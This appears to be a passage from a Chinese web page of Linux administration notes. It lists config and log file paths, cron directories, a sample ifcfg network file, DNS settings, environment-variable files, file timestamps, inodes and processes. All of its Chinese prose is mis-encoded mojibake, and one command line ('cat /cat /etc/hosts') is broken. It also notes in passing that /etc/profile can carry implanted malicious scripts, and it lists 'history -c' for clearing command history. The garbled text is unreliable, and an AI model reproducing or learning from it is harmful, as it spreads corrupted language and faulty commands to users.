<td>æ“ä½œç³»ç»Ÿç‰ˆæœ¬ä¿¡æ¯</td>
<td>/proc/version</td>
</tr>
<tr>
<td>ç³»ç»Ÿå…¨å±€ cron é…ç½®æ–‡ä»¶</td>
<td>/etc/crontab</td>
</tr>
<tr>
<td>dockeré…ç½®æ–‡ä»¶</td>
<td></td>
</tr>
<tr>
<td>nginxé…ç½®æ–‡ä»¶</td>
<td></td>
</tr>
<tr>
<td>nginxå¯åŠ¨æ–‡ä»¶</td>
<td></td>
</tr>
<tr>
<td>é…ç½®å‡½æ•°ä¿¡æ¯çš„æ–‡ä»¶</td>
<td>/etc/init.d/functions</td>
</tr>
<tr>
<td></td>
<td>/etc/docker/daemon.json</td>
</tr>
<tr>
<td>dockerä»£ç†é…ç½®æ–‡ä»¶</td>
<td>/etc/systemd/system/docker.service.d/http-proxy.conf</td>
</tr>
</tbody>
</table>
<table>
<thead>
<tr>
<th>ç›®å½•</th>
<th>è·¯å¾„</th>
</tr>
</thead>
<tbody>
<tr>
<td>è‡ªåŠ¨åŠ è½½è¿è¡Œè„šæœ¬ç›®å½•</td>
<td>/etc/profile.d/</td>
</tr>
<tr>
<td>ç³»ç»Ÿå®‰è£…è½¯ä»¶ç›®å½•(rpm æ‰‹åŠ¨æ–¹å¼ yum è‡ªåŠ¨æ–¹å¼)</td>
<td></td>
</tr>
<tr>
<td>å­˜æ”¾ç‹¬ç«‹ cron é…ç½®æ–‡ä»¶çš„ç›®å½•</td>
<td>/etc/cron.d/</td>
</tr>
<tr>
<td>æ¯ä¸ªç”¨æˆ·çš„ cron è¡¨å­˜å‚¨ç›®å½•</td>
<td>/var/spool/cron/</td>
</tr>
</tbody>
</table>
<h3 id="æ—¥å¿—ä¿¡æ¯">æ—¥å¿—ä¿¡æ¯</h3>
<p>Linuxç³»ç»Ÿæ‹¥æœ‰éå¸¸çµæ´»å’Œå¼ºå¤§çš„æ—¥å¿—åŠŸèƒ½ï¼Œå¯ä»¥ä¿å­˜å‡ ä¹æ‰€æœ‰çš„æ“ä½œè®°å½•ï¼Œå¹¶å¯ä»¥ä»ä¸­æ£€ç´¢å‡ºæˆ‘ä»¬ éœ€è¦çš„ä¿¡æ¯ã€‚</p>
<ol>
<li class="lvl-3">
<p>å†…æ ¸åŠç³»ç»Ÿæ—¥å¿—ç”±ç³»ç»ŸæœåŠ¡rsyslogç»Ÿä¸€è¿›è¡Œç®¡ç†ï¼Œæ—¥å¿—æ ¼å¼åŸºæœ¬ç›¸ä¼¼</p>
</li>
<li class="lvl-3">
<p>ç”¨æˆ·æ—¥å¿—è®°å½•ç³»ç»Ÿç”¨æˆ·ç™»å½•åŠé€€å‡ºç³»ç»Ÿçš„ç›¸å…³ä¿¡æ¯</p>
</li>
<li class="lvl-3">
<p>ç¨‹åºæ—¥å¿—ç”±ç›¸åº”çš„åº”ç”¨ç¨‹åºè¿›è¡Œç‹¬ç«‹ç®¡ç†ã€‚å¦‚ï¼šwebæœåŠ¡ï¼ŒftpæœåŠ¡ å¸¸è§æ—¥å¿—æ–‡ä»¶</p>
</li>
</ol>
<table>
<thead>
<tr>
<th><strong>æ—¥å¿—æ–‡ä»¶</strong></th>
<th><strong>ä½œç”¨</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>/var/log/secure</strong></td>
<td><strong>ç™»å½•æ—¥å¿—ã€‚è®°å½•éªŒè¯å’Œæˆæƒæ–¹é¢çš„ä¿¡æ¯ï¼Œåªè¦æ¶‰åŠè´¦å·å’Œå¯†ç çš„ç¨‹åºéƒ½ä¼šè®°å½•ï¼Œ æ¯”å¦‚ SSHç™»å½•ï¼Œ suç™»å½•ï¼Œåˆ‡æ¢ç”¨æˆ·ï¼Œ sudoæˆæƒï¼Œç”šè‡³æ·»åŠ ç”¨æˆ·å’Œä¿® æ”¹ç”¨æˆ·å¯†ç éƒ½ä¼šè®°å½•åœ¨è¿™ ä¸ªæ—¥å¿—æ–‡ä»¶ä¸­ã€‚æ–°ç‰ˆçš„ubuntuã€debianã€kaliå·²ç»æ²¡æœ‰è¿™ä¸ªæ–‡ä»¶äº† ï¼Œ æ¢æˆäº† /var/log/auth.log</strong></td>
</tr>
<tr>
<td>/var/log/message</td>
<td>é€šç”¨çš„ç³»ç»Ÿæ´»åŠ¨æ—¥å¿—ã€‚è®°å½•å†…æ ¸æ¶ˆæ¯ã€ç³»ç»ŸæœåŠ¡ï¼ˆé‚®ä»¶ã€cronç­‰ï¼‰çš„å¸¸è§„ä¿¡æ¯ã€éå…³é”®ç½‘ç»œé”™è¯¯ç­‰ã€‚</td>
</tr>
<tr>
<td>/var/log/cron</td>
<td>æ¯å½“cronè¿›ç¨‹å¼€å§‹ä¸€ä¸ªå·¥ä½œæ—¶ï¼Œå°± ä¼šå°†ç›¸å…³ä¿¡æ¯è®°å½•åœ¨è¿™ä¸ª æ–‡ä»¶ä¸­ã€‚</td>
</tr>
<tr>
<td>/var/log/syslog</td>
<td>æ‰€æœ‰ç³»ç»Ÿæ´»åŠ¨ä¿¡æ¯ï¼ˆæ¯” <code>messages</code> æ›´å…¨é¢ï¼‰ã€‚åŒ…å«å†…æ ¸ã€æœåŠ¡ã€åº”ç”¨ç­‰é™¤è®¤è¯å¤–çš„æ‰€æœ‰ä¿¡æ¯ã€‚</td>
</tr>
<tr>
<td><strong>/var/log/wtmp</strong></td>
<td><strong>æ°¸ä¹…è®°å½•æ‰€æœ‰ç”¨æˆ·çš„ç™»å½•ã€æ³¨é”€ä¿¡æ¯ï¼ŒåŒæ—¶è®°å½•ç³»ç»Ÿçš„å¯åŠ¨ã€é‡å¯ã€ å…³æœºäº‹ä»¶ã€‚åŒæ ·è¿™ä¸ªæ–‡ä»¶ä¹Ÿæ˜¯ä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œä¸èƒ½ç›´æ¥ç¼–è¾‘æŸ¥çœ‹ï¼Œ è€Œéœ€è¦ä½¿ç”¨ lastå‘½ä»¤æ¥æŸ¥çœ‹</strong></td>
</tr>
<tr>
<td><strong>/var/run/utmp</strong></td>
<td><strong>è®°å½•å½“å‰å·²ç»ç™»å½•çš„ç”¨æˆ·ä¿¡æ¯ï¼Œè¿™ä¸ªæ–‡ä»¶ä¼šéšç€ç”¨æˆ·çš„ç™»å½•å’Œæ³¨é”€ä¸ æ–­å˜åŒ–ï¼Œåªè®°å½•å½“å‰ç™»å½•ç”¨æˆ·çš„ä¿¡æ¯ã€‚åŒæ ·è¿™ä¸ªæ–‡ä»¶ä¸èƒ½ç›´æ¥ç¼–è¾‘æŸ¥ çœ‹ï¼Œè€Œè¦ä½¿ç”¨ w,who,usersç­‰å‘½ä»¤æ¥æŸ¥è¯¢</strong></td>
</tr>
<tr>
<td><strong>/var/log/btmp</strong></td>
<td><strong>è®°å½•æ‰€æœ‰å¤±è´¥ç™»å½•æ—¥å¿—ä¿¡æ¯ã€‚è¿™ä¸ªæ–‡ä»¶æ˜¯äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œä¸èƒ½ç›´æ¥ç¼–è¾‘ æŸ¥çœ‹ï¼Œä½¿ç”¨ lastbå‘½ä»¤æˆ– last -f /var/log/btmp å‘½ä»¤å¯ä»¥æŸ¥çœ‹btmpæ–‡ä»¶ã€‚</strong></td>
</tr>
<tr>
<td>/var/log/cups</td>
<td>æ¶‰åŠæ‰€æœ‰æ‰“å°ä¿¡æ¯çš„æ—¥å¿—ã€‚</td>
</tr>
<tr>
<td>/var/log/faillog</td>
<td>åŒ…å«ç”¨æˆ·ç™»å½•å¤±è´¥ä¿¡æ¯ã€‚æ­¤å¤–ï¼Œé”™è¯¯ç™»å½•å‘½ä»¤ä¹Ÿä¼šè®°å½•åœ¨æœ¬æ–‡ä»¶ä¸­</td>
</tr>
<tr>
<td>/var/log/messages</td>
<td>è®°å½•ç³»ç»Ÿé‡è¦ä¿¡æ¯çš„æ—¥å¿—ã€‚è¿™ä¸ªæ—¥å¿—æ–‡ä»¶ä¸­ä¼šè®°å½•Linuxç³»ç»Ÿçš„ç»å¤§ å¤šæ•°é‡è¦ä¿¡æ¯ï¼Œå¦‚æœç³»ç»Ÿå‡ºç°é—®é¢˜æ—¶ï¼Œé¦–å…ˆè¦æ£€æŸ¥çš„å°±åº”è¯¥æ˜¯è¿™ä¸ªæ—¥ å¿—æ–‡ä»¶ã€‚æ­¤å¤–ï¼Œ mailï¼Œcronï¼Œdaemonï¼Œkernå’Œauthç­‰å†…å®¹ä¹Ÿè®°å½•åœ¨var/log/messages</td>
</tr>
<tr>
<td>/var/log/dmesg</td>
<td>åŒ…å«å†…æ ¸ç¼“å†²ä¿¡æ¯ï¼ˆ kernel ring bufferï¼‰ã€‚åœ¨ç³»ç»Ÿå¯åŠ¨æ—¶ï¼Œä¼šåœ¨å±å¹•ä¸Šæ˜¾ç¤ºè®¸å¤šä¸ç¡¬ä»¶æœ‰å…³çš„ä¿¡æ¯ã€‚å¯ä»¥ç”¨ dmesgå‘½ä»¤ç›´æ¥æŸ¥çœ‹å†…æ ¸è‡ªæ£€ä¿¡æ¯</td>
</tr>
<tr>
<td><strong>/var/log/auth.log</strong></td>
<td><strong>åŒ…å«ç³»ç»Ÿæˆæƒä¿¡æ¯ï¼ŒåŒ…æ‹¬ç”¨æˆ·ç™»å½•å’Œä½¿ç”¨çš„æƒé™æœºåˆ¶ç­‰ã€‚</strong></td>
</tr>
<tr>
<td>/var/log/boot.log</td>
<td>åŒ…å«ç³»ç»Ÿå¯åŠ¨æ—¶çš„æ—¥å¿—ã€‚</td>
</tr>
<tr>
<td>/var/log/daemon.log</td>
<td>åŒ…å«å„ç§ç³»ç»Ÿåå°å®ˆæŠ¤è¿›ç¨‹æ—¥å¿—ä¿¡æ¯ã€‚</td>
</tr>
<tr>
<td>/var/log/dpkg.log</td>
<td>åŒ…æ‹¬å®‰è£…æˆ– dpkgå‘½ä»¤æ¸…é™¤è½¯ä»¶åŒ…çš„æ—¥å¿—ã€‚</td>
</tr>
<tr>
<td>/var/log/kern.log</td>
<td>åŒ…å«å†…æ ¸äº§ç”Ÿçš„æ—¥å¿—ï¼Œæœ‰åŠ©äºåœ¨å®šåˆ¶å†…æ ¸æ—¶è§£å†³é—®é¢˜ã€‚</td>
</tr>
<tr>
<td><strong>/var/log/lastlog</strong></td>
<td><strong>è®°å½•ç³»ç»Ÿä¸­æ‰€æœ‰ç”¨æˆ·æœ€åä¸€æ¬¡ç™»å½•æ—¶é—´çš„æ—¥å¿—ï¼Œè¿™ä¸ªæ–‡ä»¶æ˜¯äºŒè¿›åˆ¶æ–‡ ä»¶ï¼Œä¸èƒ½ç›´æ¥ç¼–è¾‘æŸ¥çœ‹ï¼Œè€Œè¦ä½¿ç”¨ lastlogå‘½ä»¤æŸ¥çœ‹</strong></td>
</tr>
<tr>
<td>/var/log/user.log</td>
<td>è®°å½•æ‰€æœ‰ç­‰çº§ç”¨æˆ·ä¿¡æ¯çš„æ—¥å¿—ã€‚</td>
</tr>
<tr>
<td>/var/log/alternatives.log</td>
<td>æ›´æ–°æ›¿ä»£ä¿¡æ¯éƒ½è®°å½•åœ¨è¿™ä¸ªæ–‡ä»¶ä¸­ã€‚</td>
</tr>
<tr>
<td>/var/log/anaconda.log</td>
<td>åœ¨å®‰è£…Linuxæ—¶ï¼Œæ‰€æœ‰å®‰è£…ä¿¡æ¯éƒ½å‚¨å­˜åœ¨è¿™ä¸ªæ–‡ä»¶ä¸­ã€‚</td>
</tr>
<tr>
<td>/var/log/yum.log</td>
<td>åŒ…å«ä½¿ç”¨ yumå®‰è£…çš„è½¯ä»¶åŒ…ä¿¡æ¯ã€‚</td>
</tr>
<tr>
<td>/var/log/maillog<br>/var/log/mail.log</td>
<td>åŒ…å«ç³»ç»Ÿè¿è¡Œç”µå­é‚®ä»¶æœåŠ¡å™¨çš„æ—¥å¿—ä¿¡æ¯ã€‚ä¾‹å¦‚ï¼Œ sendmailæ—¥å¿—ä¿¡æ¯å°±å…¨éƒ¨é€åˆ°è¿™ä¸ª æ–‡ä»¶ä¸­</td>
</tr>
</tbody>
</table>
<p>æ¯”è¾ƒé‡è¦çš„å‡ ä¸ªæ—¥å¿—ï¼š</p>
<blockquote>
<p>ç™»å½•å¤±è´¥è®°å½•ï¼š/var/log/btmp    #lastb<br>
æœ€åä¸€æ¬¡ç™»å½•ï¼š/var/log/lastlog #lastlog<br>
ç™»å½•æˆåŠŸè®°å½•: /var/log/wtmp    #last<br>
ç™»å½•æ—¥å¿—è®°å½•ï¼š/var/log/secure<br>
ç›®å‰ç™»å½•ç”¨æˆ·ä¿¡æ¯ï¼š/var/run/utmp #wã€whoã€users<br>
å†å²å‘½ä»¤è®°å½•ï¼šhistory<br>
ä»…æ¸…ç†å½“å‰ç”¨æˆ·ï¼šhistory -c</p>
</blockquote>
<h3 id="ç½‘å¡é…ç½®">ç½‘å¡é…ç½®</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim  /etc/sysconfig/network-scripts/ifcfg-ens33</span><br><span class="line"><span class="comment"># ç½‘ç»œæ¥å£ç±»å‹ï¼ˆé€šå¸¸ä¸º Ethernet æˆ– Bridgeï¼‰</span></span><br><span class="line">TYPE=Ethernet</span><br><span class="line"><span class="comment"># ä»£ç†é…ç½®æ–¹å¼ï¼ˆnone è¡¨ç¤ºä¸ä½¿ç”¨ä»£ç†ï¼‰</span></span><br><span class="line">PROXY_METHOD=none</span><br><span class="line"><span class="comment"># æ˜¯å¦ä»…ç”¨äºæµè§ˆå™¨ä»£ç†ï¼ˆno è¡¨ç¤ºä¸é™åˆ¶ï¼‰</span></span><br><span class="line">BROWSER_ONLY=no</span><br><span class="line"><span class="comment"># è·å–IPåœ°å€çš„æ–¹å¼ï¼ˆstatic è¡¨ç¤ºé™æ€IPï¼Œdhcp è¡¨ç¤ºåŠ¨æ€è·å–ï¼‰</span></span><br><span class="line">BOOTPROTO=static</span><br><span class="line"><span class="comment"># é™æ€IPåœ°å€ï¼ˆéœ€æ ¹æ®å®é™…ç½‘ç»œè§„åˆ’è®¾ç½®ï¼‰</span></span><br><span class="line">IPADDR=10.0.0.5</span><br><span class="line"><span class="comment"># å­ç½‘æ©ç ï¼ˆå®šä¹‰IPåœ°å€çš„ç½‘ç»œéƒ¨åˆ†ï¼‰</span></span><br><span class="line">NETMASK=255.255.255.0</span><br><span class="line"><span class="comment"># é»˜è®¤ç½‘å…³ï¼ˆè·¯ç”±å™¨çš„IPåœ°å€ï¼‰</span></span><br><span class="line">GATEWAY=10.0.0.254</span><br><span class="line"><span class="comment"># ä¸»DNSæœåŠ¡å™¨åœ°å€ï¼ˆæ³¨æ„ï¼šæ­¤å¤„é”™è¯¯æ·»åŠ äº†åŸŸåï¼Œåº”ä»…ä¿ç•™IPï¼‰</span></span><br><span class="line">DNS1=10.0.0.254</span><br><span class="line"><span class="comment"># æ˜¯å¦å¯ç”¨é»˜è®¤è·¯ç”±ï¼ˆyes å¯ç”¨ï¼‰</span></span><br><span class="line">DEFROUTE=<span class="built_in">yes</span></span><br><span class="line"><span class="comment"># IPv4é…ç½®å¤±è´¥æ—¶æ˜¯å¦è§†ä¸ºä¸¥é‡é”™è¯¯ï¼ˆno è¡¨ç¤ºä¸ç»ˆæ­¢ç½‘ç»œæœåŠ¡ï¼‰</span></span><br><span class="line">IPV4_FAILURE_FATAL=no</span><br><span class="line"><span class="comment"># æ˜¯å¦åˆå§‹åŒ–IPv6ï¼ˆyes å¯ç”¨ï¼‰</span></span><br><span class="line">IPV6INIT=<span class="built_in">yes</span></span><br><span class="line"><span class="comment"># æ˜¯å¦è‡ªåŠ¨é…ç½®IPv6åœ°å€ï¼ˆyes å¯ç”¨ï¼‰</span></span><br><span class="line">IPV6_AUTOCONF=<span class="built_in">yes</span></span><br><span class="line"><span class="comment"># æ˜¯å¦å¯ç”¨IPv6é»˜è®¤è·¯ç”±ï¼ˆyes å¯ç”¨ï¼‰</span></span><br><span class="line">IPV6_DEFROUTE=<span class="built_in">yes</span></span><br><span class="line"><span class="comment"># IPv6é…ç½®å¤±è´¥æ—¶æ˜¯å¦è§†ä¸ºä¸¥é‡é”™è¯¯ï¼ˆno è¡¨ç¤ºä¸ç»ˆæ­¢ç½‘ç»œæœåŠ¡ï¼‰</span></span><br><span class="line">IPV6_FAILURE_FATAL=no</span><br><span class="line"><span class="comment"># IPv6åœ°å€ç”Ÿæˆæ¨¡å¼ï¼ˆå¢å¼ºéšç§ä¿æŠ¤ï¼‰</span></span><br><span class="line">IPV6_ADDR_GEN_MODE=stable-privacy</span><br><span class="line"><span class="comment"># ç½‘ç»œè¿æ¥åç§°ï¼ˆè‡ªå®šä¹‰æ ‡è¯†ï¼‰</span></span><br><span class="line">NAME=ens33</span><br><span class="line"><span class="comment"># è®¾å¤‡å”¯ä¸€æ ‡è¯†ç¬¦ï¼ˆç³»ç»Ÿè‡ªåŠ¨ç”Ÿæˆï¼Œé€šå¸¸æ— éœ€ä¿®æ”¹ï¼‰</span></span><br><span class="line">UUID=27a73818-89f3-4991-9890-2da7924a73c4</span><br><span class="line"><span class="comment"># ç‰©ç†è®¾å¤‡åç§°ï¼ˆéœ€ä¸ç½‘å¡å®é™…åç§°ä¸€è‡´ï¼‰</span></span><br><span class="line">DEVICE=ens33</span><br><span class="line"><span class="comment"># æ˜¯å¦åœ¨ç³»ç»Ÿå¯åŠ¨æ—¶æ¿€æ´»æ­¤è¿æ¥ï¼ˆyes å¯ç”¨ï¼‰</span></span><br><span class="line">ONBOOT=<span class="built_in">yes</span></span><br></pre></td></tr></table></figure>
<p>æ›´æ”¹é…ç½®éœ€è¦é‡å¯ç½‘å¡<code>systemctl restart network</code>  æˆ– <code>service network restart</code></p>
<h3 id="åŸŸåè§£æé…ç½®">åŸŸåè§£æé…ç½®</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/resolv.conf    <span class="comment">#åŸŸåè§£æé…ç½®æ–‡ä»¶</span></span><br><span class="line">nameserver 10.0.0.254   <span class="comment">#DNSæœåŠ¡å™¨ï¼Œä¸èƒ½å†™é”™ å†™é”™å°±è®¿é—®ä¸äº†äº†</span></span><br><span class="line"><span class="built_in">cat</span> /cat /etc/hosts     <span class="comment">#è®¿é—®å†…ç½‘çš„åŸŸåé…ç½®æ–‡ä»¶</span></span><br></pre></td></tr></table></figure>
<h2 id="ç³»ç»Ÿç®¡ç†">ç³»ç»Ÿç®¡ç†</h2>
<h3 id="ç¯å¢ƒå˜é‡">ç¯å¢ƒå˜é‡</h3>
<p>å’Œå˜é‡ ç¯å¢ƒå˜é‡ åˆ«åç›¸å…³çš„é…ç½®æ–‡ä»¶ä¿¡æ¯ï¼š<code>/etc/profile</code>ã€<code>/etc/bashrc</code>ã€<code>~/.bash_profile</code> ã€<code>~/.bashrc</code>ã€<code>/etc/profile.d/</code></p>
<p>ç½‘å®‰å…³æ³¨åº”æ€¥æ•ˆåº”ï¼Œå¼‚å¸¸å ç”¨èµ„æºã€è¿›ç¨‹å…³é—­åå†æ¬¡è¿è¡Œï¼Œæœ‰å¯èƒ½æ˜¯ profile è¢«æ¤å…¥è„šæœ¬è¿è¡Œå‘½ä»¤ã€‚<code>/etc/profile</code> ã€<code>/etc/bashrc</code>ã€ä¸¤ä¸ªæ–‡ä»¶å†™åˆ°ä»»æ„ä¸€ä¸ªéƒ½ä¼šå—åˆ°å½±å“ï¼ˆæŠŠæŸä¸ªæ¶æ„è·‘è¿›ç¨‹çš„è„šæœ¬æ”¾è¿›å»ï¼‰ã€‚å±€éƒ¨å˜é‡ä¼˜äºå…¨å±€å˜é‡</p>
<p>å¦‚æœæƒ³è®©å˜é‡é‡å¯åä»ç„¶æœ‰æ•ˆå°±ä¿®æ”¹è¿™äº›æ–‡ä»¶ã€‚</p>
<h3 id="å…¶ä»–"><strong>å…¶ä»–</strong></h3>
<p><strong>æ–‡ä»¶æ—¶é—´ä¿¡æ¯åˆ†ç±»</strong></p>
<table>
<thead>
<tr>
<th>æ–‡ä»¶æ—¶é—´ä¿¡æ¯åˆ†ç±»</th>
<th>è‹±æ–‡å…¨ç§°</th>
<th>ç¼©å†™</th>
<th>è§¦å‘æ¡ä»¶</th>
</tr>
</thead>
<tbody>
<tr>
<td>æ–‡ä»¶ä¿®æ”¹æ—¶é—´</td>
<td>modified time</td>
<td>mtime</td>
<td>æ–‡ä»¶ä¿¡æ¯å†…å®¹å‘ç”Ÿå˜åŠ¨æ—¶ï¼Œä¼šä¿®æ”¹è°ƒæ•´æ­¤æ—¶é—´ä¿¡æ¯</td>
</tr>
<tr>
<td>æ–‡ä»¶è®¿é—®æ—¶é—´</td>
<td>access time</td>
<td>atime</td>
<td>æ–‡ä»¶ä¿¡æ¯å†…å®¹è¢«è®¿é—®è¯»å–æ—¶ï¼Œä¼šä¿®æ”¹è°ƒæ•´æ­¤æ—¶é—´ä¿¡æ¯</td>
</tr>
<tr>
<td>æ–‡ä»¶æ”¹å˜æ—¶é—´</td>
<td>change time</td>
<td>ctime</td>
<td>æ–‡ä»¶å±æ€§ä¿¡æ¯å‘ç”Ÿå˜åŠ¨æ—¶ï¼Œä¼šä¿®æ”¹è°ƒæ•´æ­¤æ—¶é—´ä¿¡æ¯</td>
</tr>
</tbody>
</table>
<p><strong>inodeä¸block</strong></p>
<p>æ–‡ä»¶ç´¢å¼•-inode æ•°æ®ä¿¡æ¯ç´¢å¼• æ¯åˆ›å»ºä¸€ä¸ªæ–‡ä»¶å¯ç”¨çš„ç´¢å¼•æ¬¡æ•°å°±ä¼šå‡å°‘</p>
<p>æ–‡ä»¶å¤§å°-block æ•°æ®ä¿¡æ¯å®¹é‡ æ–‡ä»¶ä¸­çš„ä¿¡æ¯å†…å®¹ä¸æ–­æ·»åŠ ï¼Œæ•°æ®å—å°±ä¼šä¸æ–­å‡å°‘</p>
<p>æŸ¥çœ‹ç›¸å…³ä¿¡æ¯ï¼š</p>
<p>df -i --inode å¯ç”¨æ•°ä¸º0 è¡¨ç¤ºç£ç›˜ç©ºé—´ä¸è¶³</p>
<p>df  block å¯ç”¨æ•° ä¸º0 è¡¨ç¤ºç£ç›˜ç©ºé—´ä¸è¶³</p>
<p>inodeï¼šé»˜è®¤å¤§å°ä¸º128æˆ–è€…256å­—èŠ‚</p>
<p>blockï¼šé»˜è®¤å¤§å°1-4kb</p>
<p>ç”±äºç£ç›˜åˆ†åŒºéƒ½æ¯”è¾ƒå¤§ï¼Œæ‰€ä»¥ä¸€ä¸ªç£ç›˜ä¸­ä¼šåˆ›å»ºå‡ºå¤§é‡çš„inodeå’Œblock</p>
<p>æœ¬è´¨ä¸Šæœ‰æ•°å­—ç¼–å·å’Œå®é™…å­˜å‚¨ç©ºé—´å¯¹åº” ä¾¿äºæ£€ç´¢æ•°æ®ä¿¡æ¯ â€”æŒ‡é’ˆ åº“ç®¡ ä¼šè®® ä»“åº“æè´§è¿‡ç¨‹</p>
<p>å­˜å‚¨çš„æ•°æ®æ–‡ä»¶ä¸­åŒ…å«æ•°æ®æ–‡ä»¶å±æ€§</p>
<p>æè¿°æ•°æ®çš„æ•°æ® â€“ å…ƒæ•°æ®</p>
<h3 id="ç³»ç»Ÿè¿›ç¨‹">ç³»ç»Ÿè¿›ç¨‹</h3>
<p>ç¨‹åºï¼ˆProgramï¼‰æ˜¯ç»å¼€å‘ç¼–è¯‘åå½¢æˆçš„é™æ€å¯æ‰§è¡Œä»£ç é›†åˆï¼Œæ˜¯æ•°æ®ä¸æŒ‡ä»¤çš„æœ‰åºå°è£…ï¼ˆå¦‚ç£ç›˜ä¸­å­˜å‚¨çš„<code>wechat.exe</code>æˆ–<code>nginx</code>äºŒè¿›åˆ¶æ–‡ä»¶ï¼‰ï¼Œå…¶ç”Ÿå‘½å‘¨æœŸç‹¬ç«‹äºè¿è¡ŒçŠ¶æ€ï¼Œå¯é•¿æœŸä¿å­˜åœ¨å­˜å‚¨ä»‹è´¨ä¸­ã€‚</p>
<p>å½“ç¨‹åºè¢«åŠ è½½åˆ°å†…å­˜å¹¶å¼€å§‹æ‰§è¡Œæ—¶ï¼Œä¾¿è½¬åŒ–ä¸º<strong>è¿›ç¨‹ï¼ˆProcessï¼‰</strong>â€”â€” å®ƒæ˜¯ç¨‹åºçš„åŠ¨æ€è¿è¡Œå®ä¾‹ã€‚æ­¤æ—¶ï¼Œæ“ä½œç³»ç»Ÿä¼šä¸ºå…¶åˆ†é…ä¸“å±çš„ç³»ç»Ÿèµ„æºï¼ˆå¦‚å†…å­˜ç©ºé—´ã€CPU æ—¶é—´ç‰‡ã€æ–‡ä»¶æè¿°ç¬¦ç­‰ï¼‰ï¼Œå¹¶è®°å½•å…¶è¿è¡ŒçŠ¶æ€ï¼ˆå¦‚å°±ç»ªã€è¿è¡Œã€é˜»å¡ç­‰ï¼‰ã€‚åŒæ—¶ï¼Œè¿›ç¨‹ä¼šå…³è”æ˜ç¡®çš„æ‰€å±ç”¨æˆ·ï¼Œå—ç³»ç»Ÿæƒé™ç®¡æ§ã€‚</p>
<p>ç®€è¨€ä¹‹ï¼Œç¨‹åºæ˜¯ â€œé™æ€çš„ä»£ç æ–‡ä»¶â€ï¼Œè€Œè¿›ç¨‹æ˜¯ â€œåŠ¨æ€çš„æ‰§è¡Œè¿‡ç¨‹â€ã€‚ä¾‹å¦‚ï¼ŒåŒå‡»<code>wechat.exe</code>åï¼Œæ“ä½œç³»ç»Ÿå°†å…¶åŠ è½½åˆ°å†…å­˜å¹¶å¯åŠ¨æ‰§è¡Œï¼Œæ­¤æ—¶ä»»åŠ¡ç®¡ç†å™¨ä¸­æ˜¾ç¤ºçš„ â€œå¾®ä¿¡â€ è¿›ç¨‹ï¼Œä¾¿æ˜¯è¯¥ç¨‹åºçš„è¿è¡Œå®ä¾‹ã€‚</p>
<h4 id="è¿›ç¨‹ä¸ç¨‹åºçš„æœ¬è´¨åŒºåˆ«">è¿›ç¨‹ä¸ç¨‹åºçš„æœ¬è´¨åŒºåˆ«</h4>
<table>
<thead>
<tr>
<th>ç»´åº¦</th>
<th>ç¨‹åºï¼ˆProgramï¼‰</th>
<th>è¿›ç¨‹ï¼ˆProcessï¼‰</th>
</tr>
</thead>
<tbody>
<tr>
<td>å­˜åœ¨å½¢æ€</td>
<td>é™æ€ï¼šä»¥äºŒè¿›åˆ¶æ–‡ä»¶ã€è„šæœ¬ç­‰å½¢å¼å­˜å‚¨äºç£ç›˜</td>
<td>åŠ¨æ€ï¼šåŠ è½½åˆ°å†…å­˜ä¸­æ‰§è¡Œçš„æŒ‡ä»¤æµä¸æ•°æ®é›†åˆ</td>
</tr>
<tr>
<td>èµ„æºå…³è”</td>
<td>ä¸å ç”¨ç³»ç»Ÿè¿è¡Œæ—¶èµ„æºï¼ˆä»…å ç”¨å­˜å‚¨èµ„æºï¼‰</td>
<td>å ç”¨ CPUã€å†…å­˜ã€I/O ç­‰å®æ—¶ç³»ç»Ÿèµ„æº</td>
</tr>
<tr>
<td>ç”Ÿå‘½å‘¨æœŸ</td>
<td>é•¿æœŸå­˜åœ¨ï¼ˆé™¤éä¸»åŠ¨åˆ é™¤æ–‡ä»¶ï¼‰</td>
<td>éšæ‰§è¡Œå¼€å§‹è€Œåˆ›å»ºï¼Œéšä»»åŠ¡å®Œæˆæˆ–å¼‚å¸¸ç»ˆæ­¢è€Œæ¶ˆäº¡ï¼ˆæœ‰æ˜ç¡®ç”Ÿå‘½å‘¨æœŸï¼‰</td>
</tr>
<tr>
<td>æ ¸å¿ƒå±æ€§</td>
<td>ä»…åŒ…å«ä»£ç é€»è¾‘ä¸é™æ€æ•°æ®</td>
<td>åŒ…å«è¿è¡ŒçŠ¶æ€ã€èµ„æºå¥æŸ„ã€è¿›ç¨‹ IDï¼ˆPIDï¼‰ã€æ‰€å±ç”¨æˆ·ç­‰åŠ¨æ€å…ƒä¿¡æ¯</td>
</tr>
</tbody>
</table>
<p>ç†è§£è¿›ç¨‹ä¸ç¨‹åºçš„åŒºåˆ«ï¼Œæ˜¯ç³»ç»Ÿè¿ç»´çš„åŸºç¡€ï¼šç¨‹åºæ˜¯ â€œå¾…æ‰§è¡Œçš„è“å›¾â€ï¼Œè€Œè¿›ç¨‹æ˜¯ â€œæ­£åœ¨æ–½å·¥çš„ç°åœºâ€â€”â€” è¿ç»´çš„æ ¸å¿ƒå·¥ä½œï¼Œæ­£æ˜¯é€šè¿‡ç›‘æ§ã€ç®¡ç†è¿™äº› â€œç°åœºâ€ï¼Œç¡®ä¿ç³»ç»ŸæŒ‰é¢„æœŸç¨³å®šè¿è¡Œã€‚</p>
<p>æ ¹æ®è¿›ç¨‹ç”Ÿå‘½å‘¨æœŸï¼Œå­˜åœ¨ä¸¤ç§ç‰¹æ®Šè¿›ç¨‹æƒ…å†µï¼š</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>åƒµå°¸è¿›ç¨‹ï¼š</p>
</li>
</ul>
<p>å¼‚å¸¸è¿›ç¨‹ ä»»åŠ¡æ²¡å¤„ç†å®Œå­è¿›ç¨‹å´©æºƒäº†ï¼Œå°±ä¼šå‡ºç°åƒµå°¸è¿›ç¨‹ï¼ˆZï¼‰ å„¿å­æ­»äº†çˆ¶äº²è¿˜åœ¨ å…³æ³¨ æœ¨é©¬ç—…æ¯’ äº§ç”Ÿå¤§é‡Z ä¼šå ç”¨å¤§é‡å†…å­˜èµ„æº</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>å­¤å„¿è¿›ç¨‹ï¼š</p>
</li>
</ul>
